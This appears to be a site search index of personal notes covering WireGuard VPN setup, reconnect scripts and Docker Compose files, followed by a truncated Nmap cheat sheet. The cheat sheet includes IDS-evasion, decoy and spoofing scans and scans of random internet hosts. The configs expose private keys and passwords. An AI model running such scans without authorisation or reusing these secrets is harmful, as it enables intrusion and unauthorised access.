tunnel\u2026\u201d as shown on the image below:</p> <p></p> <p>A publickey pair is automatically created and displayed on the screen.</p> <p></p> <p>Enter a name for the tunnel and edit the configuration as follows:</p> <pre><code>[Interface]\nPrivateKey = CLIENT_PRIVATE_KEY\nAddress = 10.0.0.2/24\n\n\n[Peer]\nPublicKey = SERVER_PUBLIC_KEY\nEndpoint = SERVER_IP_ADDRESS:51820\nAllowedIPs = 0.0.0.0/0\n</code></pre> <p>Copy</p> <p>In the interface section, add a new line to define the client tunnel Address.</p> <p>In the peer section, add the following fields:</p> <ul> <li>PublicKey - The public key of the Ubuntu server (<code>/etc/wireguard/publickey</code> file).</li> <li>Endpoint - The IP address of the Ubuntu server followed by a colon, and WireGuard port (51820).</li> <li>AllowedIPs - 0.0.0.0/0</li> </ul> <p>Once done, click on the \u201cSave\u201d button.</p>"},{"location":"Wireguard%28VPN%29/Tutorial/#add-the-client-peer-to-the-server","title":"Add the Client Peer to the Server","text":"<p>The last step is to add the client\u2019s public key and IP address to the server. To do that, run the following command on the Ubuntu server:</p> <pre><code>sudo wg set wg0 peer CLIENT_PUBLIC_KEY allowed-ips 10.0.0.2Copy\n</code></pre> <p>Make sure to change the <code>CLIENT_PUBLIC_KEY</code> with the public key you generated on the client machine (<code>sudo cat /etc/wireguard/publickey</code>) and adjust the client IP address if it is different. Windows users can copy the public key from the WireGuard application.</p> <p>Once done, go back to the client machine and bring up the tunneling interface.</p>"},{"location":"Wireguard%28VPN%29/Tutorial/#linux-and-macos-clients","title":"Linux and macOS Clients","text":"<p>Run the following command the bring up the interface:</p> <pre><code>sudo wg-quick up wg0Copy\n</code></pre> <p>Now you should be connected to the Ubuntu server, and the traffic from your client machine should be routed through it. You can check the connection with:</p> <pre><code>sudo wgCopy\ninterface: wg0\n  public key: gFeK6A16ncnT1FG6fJhOCMPMeY4hZa97cZCNWis7cSo=\n  private key: (hidden)\n  listening port: 53527\n  fwmark: 0xca6c\n\npeer: r3imyh3MCYggaZACmkx+CxlD6uAmICI8pe/PGq8+qCg=\n  endpoint: XXX.XXX.XXX.XXX:51820\n  allowed ips: 0.0.0.0/0\n  latest handshake: 53 seconds ago\n  transfer: 3.23 KiB received, 3.50 KiB sent\nCopy\n</code></pre> <p>You can also open your browser, type \u201cwhat is my ip\u201d, and you should see your Ubuntu server IP address.</p> <p>To stop the tunneling, bring down the <code>wg0</code> interface:</p> <pre><code>sudo wg-quick down wg0Copy\n</code></pre>"},{"location":"Wireguard%28VPN%29/Tutorial/#windows-clients","title":"Windows Clients","text":"<p>If you installed WireGuard on Windows, click on the \u201cActivate\u201d button. Once the peers are connected, the tunnel status will change to Active:</p> <p></p>"},{"location":"Wireguard%28VPN%29/Tutorial/#conclusion","title":"Conclusion","text":"<p>We have shown you how to install WireGuard on an Ubuntu 20.04 machine and configure it as a VPN server. This setup allows you to surf the web anonymously by keeping your traffic data private.</p> <p>If you are facing any problems, feel free to leave a comment.</p>"},{"location":"Wireguard%28VPN%29/onlyVpnSSH/","title":"onlyVpnSSH","text":""},{"location":"Wireguard%28VPN%29/onlyVpnSSH/#only-allow-ssh-in-vpn","title":"Only allow ssh in vpn","text":"<p>Create this script rules in <code>/etc/wireguadr/iptables.sh</code></p> <p>Do execution permissions <code>sudo chmod +x /etc/wireguadr/iptables.sh</code></p> <pre><code>#!/bin/bash\n# create wireguard chain\niptables -t filter -N wireguard\n# permit anything coming from or going to port 22\niptables -t filter -A wireguard -p tcp --dport 1024:65535 --sport 22 -m state --state ESTABLISHED -j ACCEPT\niptables -t filter -A wireguard -p tcp --sport 1024:65535 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT\n# drop everything else\niptables -t filter -A wireguard -j DROP\n</code></pre> <p>Add this conf in /etc/wireguard/wg0.conf</p> <pre><code>PostUp = iptables -t filter -I FORWARD -i %i -j wireguard\nPostUp = iptables -t filter -I FORWARD -o %i -j wireguard\n</code></pre> <p>Config file looks like that</p> <pre><code>[Interface]\nAddress = 10.13.13.5\nPrivateKey = qPZQj/5R+xOeuta1Ml+UDpqPRvt18hc8CHlxTyxbNmo=\nListenPort = 51820\nDNS = 10.13.13.1\nPostUp = iptables -t filter -I FORWARD -i %i -j wireguard\nPostUp = iptables -t filter -I FORWARD -o %i -j wireguard\n[Peer]\nPublicKey = CAKN4TCOQdbpujsCN2V4YNxlLFHP+ue+rvgz2wqT8H8=\nPresharedKey = qCA1/rDORiPpGQjJA75ssnENj7MF5dOQgaKZ3BtkzH4=\nEndpoint = 35.239.20.21:51820\nAllowedIPs = 10.13.13.0/24\n</code></pre> <p>Add script in <code>crontab -e</code></p> <pre><code>@reboot bash /etc/wireguard/iptables.sh\n</code></pre> <p>Restart VPN</p> <pre><code>sudo wg-quick down wg0\nsystemctl restart wg-quick@wg0.service\nsudo wg-quick up wg0\n</code></pre>"},{"location":"Wireguard%28VPN%29/troubleshoot/","title":"Troubleshoot","text":""},{"location":"Wireguard%28VPN%29/troubleshoot/#tunnel-disconnect","title":"Tunnel disconnect","text":"<p>Linux :</p> <ul> <li>create a new bash file, ( $ <code>sudo nano /etc/wireguard/wg0retry.bash</code> ) with this content:</li> </ul> <pre><code>#!/bin/bash\nwhile true\ndo\n   sleep 15\n   wg-quick up wg0\ndone\n</code></pre> <p>EDIT: this script (replacement for the bloc of code above - <code>wg0retry.bash</code>) is more robust if you don't mind the little extra bandwidth. I added a ping every 15sec to validate that the tunnel is connected, replace \"\" for the IP of your Wireguard \"server\" : <pre><code>#!/bin/bash\nwhile true\ndo\n    sleep 15\n    ping -c 1 &lt;your_wireguard_server_ip&gt;\n    if [ $? != 0 ]\n    then\n        wg-quick down wg0\n        sleep 4\n        wg-quick up wg0\n    fi\ndone\n</code></pre> <p>it will retry every 15 seconds to start the wg0 tunnel, so when the tunnel is already working it will do nothing and when the tunnel is down it will revive it.</p> <ul> <li>add a superuser crontab ( $ <code>sudo crontab -e</code> ) to run the previously created script at boot :</li> </ul> <pre><code>@reboot bash /etc/wireguard/wg0retry.bash\n</code></pre> <ul> <li>And you're done! Wireguard is now indestructible on Linux.</li> </ul> <p>Windows:</p> <ul> <li>Install wireguard-windows</li> <li>Copy your configuration file to the Wireguard installation folder C:\\Program Files\\WireGuard\\wg0.conf</li> <li>Create a \".bat\" file with this content and save it to the Wireguard installation folder <code>C:\\Program Files\\WireGuard\\wg0retry.bat</code> :</li> </ul> <pre><code>@echo OFF\n\n:loop\n\nset _ServiceName=WireGuardTunnel$wg0\n\nsc query %_ServiceName% | find \"does not exist\" &gt;nul\nif %ERRORLEVEL% EQU 0 \"C:\\Program Files\\WireGuard\\WireGuard.exe\" /installtunnelservice \"C:\\Program Files\\WireGuard\\wg0.conf\" &amp; echo \"installing service\"\nif %ERRORLEVEL% EQU 1 echo \"Service Exist!\"\n\nsc query %_ServiceName% | find \"STOPPED\" &gt;nul\nif %ERRORLEVEL% EQU 0 sc start %_ServiceName% &amp; echo \"starting service\"\nif %ERRORLEVEL% EQU 1 echo \"Service Started!\"\ntimeout /t 15\n\ngoto loop\n</code></pre> <p>EDIT: this script (replacement for the bloc of code above - <code>wg0retry.bat</code>) is more robust if you don't mind the little extra bandwidth. I added a ping every 15sec to validate that the tunnel is connected, replace \"\" for the IP of your Wireguard \"server\" : <pre><code>@echo OFF\n\n:loop\n\nset _ServiceName=WireGuardTunnel$wg0\n\nsc query %_ServiceName% | find \"does not exist\" &gt;nul\nif %ERRORLEVEL% EQU 0 \"C:\\Program Files\\WireGuard\\WireGuard.exe\" /installtunnelservice \"C:\\Program Files\\WireGuard\\wg0.conf\" &amp; echo \"installing service\"\nif %ERRORLEVEL% EQU 1 echo \"Service Exist!\"\n\nsc query %_ServiceName% | find \"STOPPED\" &gt;nul\nif %ERRORLEVEL% EQU 0 sc start %_ServiceName% &amp; echo \"starting service\"\nif %ERRORLEVEL% EQU 1 echo \"Service Started!\"\n\ntimeout /t 15\n\nping -n 1 &lt;your_wireguard_server_ip&gt; | find \"TTL=\" &gt;nul\nif errorlevel 1 (\n    echo \"server not responding, restarting service\"\n    sc stop %_ServiceName%\n    timeout /t 5\n    sc start %_ServiceName%\n    timeout /t 5\n)\n\ngoto loop\n</code></pre> <p>this batch script will check in the Windows Service Control (sc) if the service for the tunnel of Wireguard wg0 exist, if it exist, the script does nothing here. If the service does not exist, it will run the command line installation for the Wireguard tunnel service (/installtunnelservice).</p> <p>Then the script will check if the service for the tunnel of Wireguard wg0 is running. If it's running the script does nothing. If it's not running, it will start the service. The script loop every 15 seconds.</p> <ul> <li>download NSSM : http://nssm.cc/download</li> <li>extract the nssm zip file to <code>C:\\Program Files\\NSSM\\</code> since you don't want to delete or move this executable after the next step.</li> <li>Run cmd.exe as Administrator, and execute those lines:</li> </ul> <pre><code>\"C:\\Program Files\\NSSM\\win64\\nssm.exe\" install wg0retry \"C:\\Program Files\\WireGuard\\wg0retry.bat\"\n\"C:\\Program Files\\NSSM\\win64\\nssm.exe\" start wg0retry\n</code></pre> <p>It will install a new Windows Service that will start at boot and will execute our script wg0retry.bat</p> <ul> <li>And you're done! Wireguard is now indestructible on Windows.</li> </ul> <p>* Please note that this method is independent of the Wireguard tray application and even if you quit Wireguard, or use it to disconnect, the tunnel will still be connected. To be able to disconnect the tunnel, You need to stop the service in (in Administrator cmd.exe) :</p> <pre><code>\"C:\\Program Files\\NSSM\\win64\\nssm.exe\" stop wg0retry\n</code></pre> <p>or if you want to remove it permanently:</p> <pre><code>\"C:\\Program Files\\NSSM\\win64\\nssm.exe\" remove wg0retry\n</code></pre> <p>Hope this helps.</p>"},{"location":"Wireguard%28VPN%29/wireguard/","title":"Wireguard","text":""},{"location":"Wireguard%28VPN%29/wireguard/#wireguard","title":"Wireguard","text":"<pre><code>systemctl disable systemd-resolved.service\nsystemctl stop systemd-resolved\n</code></pre>"},{"location":"Wireguard%28VPN%29/wireguard/#compose-with-pihole","title":"Compose with PiHole","text":"<pre><code>version: '3.7'\n\nservices:\n  wireguard:\n    image: linuxserver/wireguard\n    container_name: wireguard\n    cap_add:\n      - NET_ADMIN\n      - SYS_MODULE\n    environment:\n      - PUID=1000\n      - PGID=1000\n      - TZ=America/Mendoza\n      - SERVERPORT=51820 #optional\n      - PEERS=2 #optional\n      - PEERDNS=auto #optional\n      - INTERNAL_SUBNET=10.13.13.0 #optional\n    volumes:\n      - /root/wireguard:/config\n      - /lib/modules:/lib/modules\n      - /usr/src:/usr/src\n    ports:\n      - 51820:51820/udp\n    sysctls:\n      - net.ipv4.conf.all.src_valid_mark=1\n    dns:\n      - 172.20.0.7\n    restart: unless-stopped\n    networks:\n      containers:\n        ipv4_address: 172.20.0.6\n\n  pihole:\n    container_name: pihole\n    image: pihole/pihole:v5.7\n    expose:\n      - \"53\"\n      - \"67\"\n      - \"80\"\n      - \"443\"\n    environment:\n      TZ: 'America/Mendoza'\n      WEBPASSWORD: 'peladonerd'\n    volumes:\n      - './etc-pihole/:/etc/pihole/'\n      - './etc-dnsmasq.d/:/etc/dnsmasq.d/'\n    cap_add:\n      - NET_ADMIN\n    restart: unless-stopped\n    networks:\n      containers:\n        ipv4_address: 172.20.0.7\n\nnetworks:\n  containers:\n    ipam:\n      config:\n        - subnet: 172.20.0.0/24\n</code></pre>"},{"location":"Wireguard%28VPN%29/wireguard/#compose-wireguard-server","title":"Compose Wireguard SERVER","text":"<pre><code>version: '3.3'\nservices:\n  wireguard:\n    image: linuxserver/wireguard\n    container_name: wireguard\n    cap_add:\n      - NET_ADMIN\n      - SYS_MODULE\n    environment:\n      - PUID=1000\n      - PGID=1000\n      - TZ=Europe/Madrid\n      - SERVERURL=1.1.1.1 #optional\n      - SERVERPORT=51820 #optional\n      - PEERS=2 #optional\n      - PEERDNS=auto #optional\n      - INTERNAL_SUBNET=10.13.13.0 #optional\n    volumes:\n      - /path/to/appdata/config:/config\n      - /lib/modules:/lib/modules\n      - /usr/src:/usr/src\n    ports:\n      - 51820:51820/udp\n    sysctls:\n      - net.ipv4.conf.all.src_valid_mark=1\n    restart: unless-stopped\n</code></pre>"},{"location":"Wireguard%28VPN%29/wireguard/#compose-wireguard-client","title":"Compose Wireguard CLIENT","text":"<pre><code># Add wg0.conf in ./config\n\nversion: '3.3'\nservices:\n  wireguard:\n    image: linuxserver/wireguard\n    container_name: wireguard\n    cap_add:\n      - NET_ADMIN\n      - SYS_MODULE\n    environment:\n      - PUID=1000\n      - PGID=1000\n      - TZ=Europe/Madrid\n      - SERVERURL=1.1.1.1 #optional\n      - SERVERPORT=51820 #optional\n      #- PEERS=2 #optional\n      - PEERDNS=auto #optional\n      - INTERNAL_SUBNET=10.13.13.0 #optional\n    volumes:\n      - ./config:/config\n      - /lib/modules:/lib/modules\n      - /usr/src:/usr/src\n#    ports:\n #     - 51820:51820/udp\n    network_mode: host\n#    sysctls:\n#      - net.ipv4.conf.all.src_valid_mark=1\n    restart: unless-stopped\n</code></pre>"},{"location":"Wireguard%28VPN%29/wireguard/#wireguard-frontend","title":"Wireguard Frontend","text":"<pre><code>version: \"3.8\"\nservices:\n  wg-easy:\n    environment:\n      # \u26a0\ufe0f Required:\n      # Change this to your host's public address\n      - WG_HOST=raspberrypi.local\n\n      # Optional:\n      # - PASSWORD=foobar123\n      # - WG_PORT=51820\n      # - WG_DEFAULT_ADDRESS=10.8.0.x\n      # - WG_DEFAULT_DNS=1.1.1.1\n      # - WG_MTU=1420\n      # - WG_ALLOWED_IPS=192.168.15.0/24, 10.0.1.0/24\n      # - WG_PRE_UP=echo \"Pre Up\" &gt; /etc/wireguard/pre-up.txt\n      # - WG_POST_UP=echo \"Post Up\" &gt; /etc/wireguard/post-up.txt\n      # - WG_PRE_DOWN=echo \"Pre Down\" &gt; /etc/wireguard/pre-down.txt\n      # - WG_POST_DOWN=echo \"Post Down\" &gt; /etc/wireguard/post-down.txt\n\n    image: weejewel/wg-easy\n    container_name: wg-easy\n    volumes:\n      - .:/etc/wireguard\n    ports:\n      - \"51820:51820/udp\"\n      - \"51821:51821/tcp\"\n    restart: unless-stopped\n    cap_add:\n      - NET_ADMIN\n      - SYS_MODULE\n    sysctls:\n      - net.ipv4.ip_forward=1\n      - net.ipv4.conf.all.src_valid_mark=1\n</code></pre> <pre><code>version: \"3.8\"\nservices:\n  wg-easy:\n    environment:\n      # \u26a0\ufe0f Required:\n      # Change this to your host's public address\n      - WG_HOST=95.217.210.147\n\n      # Optional:\n      - PASSWORD=123456\n      - WG_PORT=51820\n      - WG_DEFAULT_ADDRESS=10.14.14.x\n      - WG_DEFAULT_DNS=1.1.1.1\n      # - WG_MTU=1420\n      - WG_PERSISTENT_KEEPALIVE=0\n      - WG_ALLOWED_IPS=10.14.14.0/24\n      # - WG_PRE_UP=echo \"Pre Up\" &gt; /etc/wireguard/pre-up.txt\n      # - WG_POST_UP=echo \"Post Up\" &gt; /etc/wireguard/post-up.txt\n      # - WG_PRE_DOWN=echo \"Pre Down\" &gt; /etc/wireguard/pre-down.txt\n      # - WG_POST_DOWN=echo \"Post Down\" &gt; /etc/wireguard/post-down.txt\n    image: weejewel/wg-easy\n    container_name: wg-easy\n    volumes:\n      - ./:/etc/wireguard\n    ports:\n      - \"51820:51820/udp\"\n      - \"51821:51821/tcp\"\n    restart: unless-stopped\n    cap_add:\n      - NET_ADMIN\n      - SYS_MODULE\n    sysctls:\n      - net.ipv4.ip_forward=1\n      - net.ipv4.conf.all.src_valid_mark=1\n</code></pre>"},{"location":"Wireguard%28VPN%29/wireguard/#docker-command","title":"Docker Command","text":"<pre><code>docker run -d \\\n  --name=wireguard \\\n  --cap-add=NET_ADMIN \\\n  --cap-add=SYS_MODULE \\\n  -e PUID=1000 \\\n  -e PGID=1000 \\\n  -e TZ=Europe/London \\\n  -e SERVERPORT=51820 `#optional` \\\n  -e PEERS=4 `#optional` \\\n  -e PEERDNS=auto `#optional` \\\n  -e INTERNAL_SUBNET=10.13.13.0 `#optional` \\\n  -e ALLOWEDIPS=0.0.0.0/0 `#optional` \\\n  -e LOG_CONFS=true `#optional` \\\n  -p 51820:51820/udp \\\n  -v /path/to/appdata/config:/config \\\n  -v /lib/modules:/lib/modules `#optional` \\\n  --sysctl=\"net.ipv4.conf.all.src_valid_mark=1\" \\\n  --restart unless-stopped \\\n  linuxserver/wireguard\n</code></pre>"},{"location":"Wireguard%28VPN%29/wireguard/#install-in-linux","title":"Install in linux","text":"<p>Nota*: *Se tom\u00f3 como ejemplo Ubuntu 19.10.</p> <p>1. En primer lugar, debe crear el archivo de configuraci\u00f3n WireGuard\u00ae en su oficina del usuario. Para hacer esto, siga las instrucciones descritas en este manual.</p> <p>2. Cree el repositorio WireGuard\u00ae:</p> <pre><code>sudo add-apt-repository ppa:wireguard/wireguard\n</code></pre> <p>3. Instale los paquetes WireGuard\u00ae:</p> <pre><code>sudo apt install wireguard\n</code></pre> <p>Instale el paquete resolv.conf:</p> <pre><code>sudo apt install resolvconf\n</code></pre> <p>4. Vaya al directorio WireGuard\u00ae y cree el archivo wg0.conf:</p> <pre><code>cd /etc/wireguard\n</code></pre> <p>5. Copie la configuracion de WireGuard\u00ae que recibi\u00f3 en su Oficina del usuario y p\u00e9guelas en el archivo wg0.conf usando su editor de texto:</p> <pre><code>nano wg0.conf\n</code></pre> <p>6. Encienda su conexi\u00f3n WireGuard\u00ae y disfrute de una navegaci\u00f3n web r\u00e1pida y fiable:</p> <pre><code>systemctl start wg-quick@wg0\n</code></pre> <p>7. Si desea mantener su conexi\u00f3n WireGuard\u00ae activa desde el inicio del sistema, imprima el siguiente comando:</p> <pre><code>systemctl enable wg-quick@wg0\n</code></pre> <p>8. Apague la conexi\u00f3n WireGuard\u00ae usando el comando:</p> <pre><code>systemctl stop wg-quick@wg0\n</code></pre> <p>9. Si desea desactivar el inicio autom\u00e1tico, use el comando:</p> <pre><code>systemctl disable wg-quick@wg0\n</code></pre> <pre><code>sudo wg-quick down wg0\nsystemctl restart wg-quick@wg0.service\nwg show\n</code></pre>"},{"location":"cyberSecurity/Nmap%20Cheat%20Sheet%202024%20All%20the%20Commands%20%26%20Flags/","title":"Nmap Cheat Sheet 2024: All the Commands &amp; Flags","text":"<p>February 7, 2024 / By </p> <p>Nathan House</p> <p></p> <p>1.9k</p> <p>SHARES</p> <p>*\ue80c*Listen to the article</p> <p>The one downside to a tool as robust and powerful as Nmap is remembering so many commands. Even many seasoned industry professionals fail to make the most of Nmap simply because keeping track of all its flags can prove such a challenge.</p> <p>We have compiled and organized this Nmap cheat sheet to help you master what is arguably the most useful tool in any penetration tester\u2019s arsenal. Whether you use it to memorize Nmap\u2019s options, as a quick reference to keep nearby, or as a study sheet for your CEH/Pentest+ exam, we\u2019re certain it will help you become a Nmap pro.</p> <p>Download your own copy of this cheat sheet here. Now, let\u2019s get to the Nmap commands.</p>"},{"location":"cyberSecurity/Nmap%20Cheat%20Sheet%202024%20All%20the%20Commands%20%26%20Flags/#nmap-cheat-sheet-search","title":"Nmap Cheat Sheet Search","text":"<p>Search our Nmap cheat sheet to find the right cheat for the term you're looking for. Simply enter the term in the search bar and you'll receive the matching cheats available.</p>"},{"location":"cyberSecurity/Nmap%20Cheat%20Sheet%202024%20All%20the%20Commands%20%26%20Flags/#target-specification","title":"Target Specification","text":"SWITCH EXAMPLE **DESCRIPTION**** nmap 192.168.1.1 Scan a single IP nmap 192.168.1.1 192.168.2.1 Scan specific IPs nmap 192.168.1.1-254 Scan a range nmap scanme.nmap.org Scan a domain nmap 192.168.1.0/24 Scan using CIDR notation -iL nmap -iL targets.txt Scan targets from a file -iR nmap -iR 100 Scan 100 random hosts -exclude nmap -exclude 192.168.1.1 Exclude listed hosts"},{"location":"cyberSecurity/Nmap%20Cheat%20Sheet%202024%20All%20the%20Commands%20%26%20Flags/#nmap-scan-techniques","title":"Nmap Scan Techniques","text":"SWITCH EXAMPLE **DESCRIPTION**** -sS nmap 192.168.1.1 -sS TCP SYN port scan (Default) -sT nmap 192.168.1.1 -sT TCP connect port scan (Default without root privilege) -sU nmap 192.168.1.1 -sU UDP port scan -sA nmap 192.168.1.1 -sA TCP ACK port scan -sW nmap 192.168.1.1 -sW TCP Window port scan -sM nmap 192.168.1.1 -sM TCP Maimon port scan <p>Download the PDF Version of This NMAP Cheat Sheet!</p> <p>Want to keep this cheat sheet at your fingertips? Just enter your email address, and we\u2019ll send a PDF copy to your inbox.</p> <p>DOWNLOAD \u2192</p>"},{"location":"cyberSecurity/Nmap%20Cheat%20Sheet%202024%20All%20the%20Commands%20%26%20Flags/#host-discovery","title":"Host Discovery","text":"SWITCH EXAMPLE **DESCRIPTION**** -sL nmap 192.168.1.1-3 -sL No Scan. List targets only -sn nmap 192.168.1.1/24 -sn Disable port scanning. Host discovery only. -Pn nmap 192.168.1.1-5 -Pn Disable host discovery. Port scan only. -PS nmap 192.168.1.1-5 -PS22-25,80 TCP SYN discovery on port x. Port 80 by default -PA nmap 192.168.1.1-5 -PA22-25,80 TCP ACK discovery on port x. Port 80 by default -PU nmap 192.168.1.1-5 -PU53 UDP discovery on port x. Port 40125 by default -PR nmap 192.168.1.1-1/24 -PR ARP discovery on local network -n nmap 192.168.1.1 -n Never do DNS resolution"},{"location":"cyberSecurity/Nmap%20Cheat%20Sheet%202024%20All%20the%20Commands%20%26%20Flags/#nmap-command-generator","title":"Nmap Command Generator","text":"<p>Say goodbye to the hassle of trying to remember the exact syntax for your Nmap commands! With our Nmap Command Generator, you can simply say what you need Nmap to do and we will generate the command for you.</p> <p>Generate</p>"},{"location":"cyberSecurity/Nmap%20Cheat%20Sheet%202024%20All%20the%20Commands%20%26%20Flags/#port-specification","title":"Port Specification","text":"SWITCH EXAMPLE **DESCRIPTION**** -p nmap 192.168.1.1 -p 21 Port scan for port x -p nmap 192.168.1.1 -p 21-100 Port range -p nmap 192.168.1.1 -p U:53,T:21-25,80 Port scan multiple TCP and UDP ports -p nmap 192.168.1.1 -p- Port scan all ports -p nmap 192.168.1.1 -p http,https Port scan from service name -F nmap 192.168.1.1 -F Fast port scan (100 ports) -top-ports nmap 192.168.1.1 -top-ports 2000 Port scan the top x ports -p-65535 nmap 192.168.1.1 -p-65535 Leaving off initial port in range makes the scan start at port 1 -p0- nmap 192.168.1.1 -p0- Leaving off end port in range makes the scan go through to port 65535"},{"location":"cyberSecurity/Nmap%20Cheat%20Sheet%202024%20All%20the%20Commands%20%26%20Flags/#service-and-version-detection","title":"Service and Version Detection","text":"SWITCH EXAMPLE **DESCRIPTION**** -sV nmap 192.168.1.1 -sV Attempts to determine the version of the service running on port -sV -version-intensity nmap 192.168.1.1 -sV -version-intensity 8 Intensity level 0 to 9. Higher number increases possibility of correctness -sV -version-light nmap 192.168.1.1 -sV -version-light Enable light mode. Lower possibility of correctness. Faster -sV -version-all nmap 192.168.1.1 -sV -version-all Enable intensity level 9. Higher possibility of correctness. Slower -A nmap 192.168.1.1 -A Enables OS detection, version detection, script scanning, and traceroute"},{"location":"cyberSecurity/Nmap%20Cheat%20Sheet%202024%20All%20the%20Commands%20%26%20Flags/#os-detection","title":"OS Detection","text":"SWITCH EXAMPLE **DESCRIPTION**** -O nmap 192.168.1.1 -O Remote OS detection using TCP/IP stack fingerprinting -O -osscan-limit nmap 192.168.1.1 -O -osscan-limit If at least one open and one closed TCP port are not found it will not try OS detection against host -O -osscan-guess nmap 192.168.1.1 -O -osscan-guess Makes Nmap guess more aggressively -O -max-os-tries nmap 192.168.1.1 -O -max-os-tries 1 Set the maximum number x of OS detection tries against a target -A nmap 192.168.1.1 -A Enables OS detection, version detection, script scanning, and traceroute"},{"location":"cyberSecurity/Nmap%20Cheat%20Sheet%202024%20All%20the%20Commands%20%26%20Flags/#timing-and-performance","title":"Timing and Performance","text":"SWITCH EXAMPLE **DESCRIPTION**** -T0 nmap 192.168.1.1 -T0 Paranoid (0) Intrusion Detection System evasion -T1 nmap 192.168.1.1 -T1 Sneaky (1) Intrusion Detection System evasion -T2 nmap 192.168.1.1 -T2 Polite (2) slows down the scan to use less bandwidth and use less target machine resources -T3 nmap 192.168.1.1 -T3 Normal (3) which is default speed -T4 nmap 192.168.1.1 -T4 Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network -T5 nmap 192.168.1.1 -T5 Insane (5) speeds scan; assumes you are on an extraordinarily fast network"},{"location":"cyberSecurity/Nmap%20Cheat%20Sheet%202024%20All%20the%20Commands%20%26%20Flags/#timing-and-performance-switches","title":"Timing and Performance Switches","text":"SWITCH *EXAMPLE INPUT* *****DESCRIPTION***** -host-timeout  1s; 4m; 2h Give up on target after this long -min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout  1s; 4m; 2h Specifies probe round trip time -min-hostgroup/max-hostgroup &lt;size 50; 1024 Parallel host scan group sizes -min-parallelism/max-parallelism  10; 1 Probe parallelization -max-retries  3 Specify the maximum number of port scan probe retransmissions -min-rate  100 Send packets no slower than  per second -max-rate  100 Send packets no faster than  per second"},{"location":"cyberSecurity/Nmap%20Cheat%20Sheet%202024%20All%20the%20Commands%20%26%20Flags/#nse-scripts","title":"NSE Scripts","text":"SWITCH *EXAMPLE* *****DESCRIPTION***** -sC nmap 192.168.1.1 -sC Scan with default NSE scripts. Considered useful for discovery and safe -script default nmap 192.168.1.1 -script default Scan with default NSE scripts. Considered useful for discovery and safe -script nmap 192.168.1.1 -script=banner Scan with a single script. Example banner -script nmap 192.168.1.1 -script=http* Scan with a wildcard. Example http -script nmap 192.168.1.1 -script=http,banner Scan with two scripts. Example http and banner -script nmap 192.168.1.1 -script \"not intrusive\" Scan default, but remove intrusive scripts -script-args nmap -script snmp-sysdescr -script-args snmpcommunity=admin 192.168.1.1 NSE script with arguments"},{"location":"cyberSecurity/Nmap%20Cheat%20Sheet%202024%20All%20the%20Commands%20%26%20Flags/#useful-nse-script-examples","title":"Useful NSE Script Examples","text":"**COMMAND**** *****DESCRIPTION***** nmap -Pn -script=http-sitemap-generator scanme.nmap.org http site map generator nmap -n -Pn -p 80 -open -sV -vvv -script banner,http-title -iR 1000 Fast search for random web servers nmap -Pn -script=dns-brute domain.com Brute forces DNS hostnames guessing subdomains nmap -n -Pn -vv -O -sV -script smb-enum*,smb-ls,smb-mbenum,smb-os-discovery,smb-s*,smb-vuln*,smbv2* -vv 192.168.1.1 Safe SMB scripts to run nmap -script whois* domain.com Whois query nmap -p80 -script http-unsafe-output-escaping scanme.nmap.org Detect cross site scripting vulnerabilities nmap -p80 -script http-sql-injection scanme.nmap.org Check for SQL injections"},{"location":"cyberSecurity/Nmap%20Cheat%20Sheet%202024%20All%20the%20Commands%20%26%20Flags/#firewall-ids-evasion-and-spoofing","title":"Firewall / IDS Evasion and Spoofing","text":"SWITCH *EXAMPLE* *****DESCRIPTION***** -f nmap 192.168.1.1 -f Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters -mtu nmap 192.168.1.1 -mtu 32 Set your own offset size -D nmap -D 192.168.1.101,192.168.1.102,192.168.1.103,192.168.1.23 192.168.1.1 Send scans from spoofed IPs -D nmap -D decoy-ip1,decoy-ip2,your-own-ip,decoy-ip3,decoy-ip4 remote-host-ip Above example explained -S nmap -S www.microsoft.com www.facebook.com Scan Facebook from Microsoft (-e eth0 -Pn may be required) -g nmap -g 53 192.168.1.1 Use given source port number -proxies nmap -proxies http://192.168.1.1:8080, http://192.168.1.2:8080 192.168.1.1 Relay connections through HTTP/SOCKS4 proxies -data-length nmap -data-length 200 192.168.1.1 Appends random data to sent packets <p>Example IDS Evasion command</p> <p>nmap -f -t 0 -n -Pn --data-length 200 -D 192.168.1.101,192.168.1.102,192.168.1.103,192.168.1.23 192.168.1.1</p>"},{"location":"cyberSecurity/Nmap%20Cheat%20Sheet%202024%20All%20the%20Commands%20%26%20Flags/#output","title":"Output","text":"SWITCH *EXAMPLE* *****DESCRIPTION***** -oN nmap 192.168.1.1 -oN normal.file Normal output to the file normal.file -oX nmap 192.168.1.1 -oX xml.file XML output to the file xml.file -oG nmap 192.168.1.1 -oG grep.file Grepable output to the file grep.file -oA nmap 192.168.1.1 -oA results Output in the three major formats at once -oG - nmap 192.168.1.1 -oG - Grepable output to screen. -oN -, -oX - also usable -append-output nmap 192.168.1.1 -oN file.file -append-output Append a scan to a previous scan file -v nmap 192.168.1.1 -v Increase the verbosity level (use -vv or more for greater effect) -d nmap 192.168.1.1 -d Increase debugging level (use -dd or more for greater effect) -reason nmap 192.168.1.1 -reason Display the reason a port is in a particular state, same output as -vv -open nmap 192.168.1.1 -open Only show open (or possibly open) ports -packet-trace nmap 192.168.1.1 -T4 -packet-trace Show all packets sent and received -iflist nmap -iflist Shows the host interfaces and routes -resume nmap -resume results.file Resume a scan <p>Download the PDF Version of This NMAP Cheat Sheet!</p> <p>Want to keep this cheat sheet at your fingertips? Just enter your email address, and we\u2019ll send a PDF copy to your inbox.</p> <p>DOWNLOAD \u2192</p>"},{"location":"cyberSecurity/Nmap%20Cheat%20Sheet%202024%20All%20the%20Commands%20%26%20Flags/#helpful-nmap-output-examples","title":"Helpful Nmap Output examples","text":"**COMMAND**** *****DESCRIPTION***** nmap -p80 -sV -oG - -open 192.168.1.1/24 | grep open Scan for web servers and grep to show which IPs are running web servers nmap -iR 10 -n -oX out.xml | grep \"Nmap\" | cut -d \" \" -f5 &gt; live-hosts.txt Generate a list of the IPs of live hosts nmap -iR 10 -n -oX out2.xml | grep \"Nmap\" | cut -d \" \" -f5 &gt;&gt; live-hosts.txt Append IP to the list of live hosts ndiff scanl.xml scan2.xml Compare output from nmap using the ndif xsltproc nmap.xml -o nmap.html Convert nmap xml files to html files grep \" open \" results.nmap | sed -r \u2018s/ +/ /g\u2019 | sort | uniq -c | sort -rn | less Reverse sorted list of how often ports turn 